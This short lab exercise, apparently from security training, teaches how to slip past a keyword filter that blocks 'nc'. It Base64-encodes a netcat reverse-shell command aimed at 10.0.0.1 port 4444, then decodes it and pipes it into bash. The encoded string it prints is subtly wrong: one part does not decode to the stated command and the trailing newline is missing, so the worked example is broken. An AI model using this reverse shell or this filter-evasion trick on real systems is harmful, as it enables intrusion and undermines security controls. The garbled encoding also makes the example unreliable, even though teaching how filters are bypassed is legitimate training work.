# Lab 1: Simple Obfuscation with Base64

## Goal: Bypass a simple keyword-based filter.

## Scenario:
A security filter blocks any command containing the word "nc" (netcat).

## The Attack:
1. **Encode the command**:
   `echo "nc -e /bin/sh 10.0.0.1 4444" | base64`
   $\rightarrow$ Result: `bmMgLWUgL2Jpbi9zaCAxMC4wLjC4MSA0NDQ0`
2. **Run the encoded command**:
   `echo "bmMgLWUgL2Jpbi9zaCAxMC4wLjC4MSA0NDQ0" | base64 -d | bash`

## Success Check:
- [ ] Successfully executed a command that was "hidden" in Base64.
- [ ] Understand why Base64 is not "encryption" but "encoding".
